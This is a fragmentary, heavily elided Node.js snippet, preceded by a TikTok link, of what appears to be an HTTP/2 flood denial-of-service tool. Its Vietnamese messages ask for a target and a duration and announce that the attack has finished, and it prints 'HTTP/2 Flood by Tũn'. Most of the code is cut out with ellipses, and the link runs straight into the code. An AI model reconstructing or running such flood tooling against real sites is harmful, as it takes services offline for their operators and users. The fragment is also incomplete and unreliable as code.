https://vt.tiktok.com/ZSLcx6oAB/const { exec } = require('child_process');
...
var parsed = url.parse(objetive);
    ...
    console.log('hãy chọn mục tieu và thời gian');
    process.exit();
}
const sigalgs = [
...
class TlsBuilder {
    ...
    Alert(){
        console.log('HTTP/2 Flood by Tũn');
    }
...
setTimeout(function(){
    console.log('Đã xnong cuộc tấn công')
    process.exit();
}, process.argv[3] * 1000);
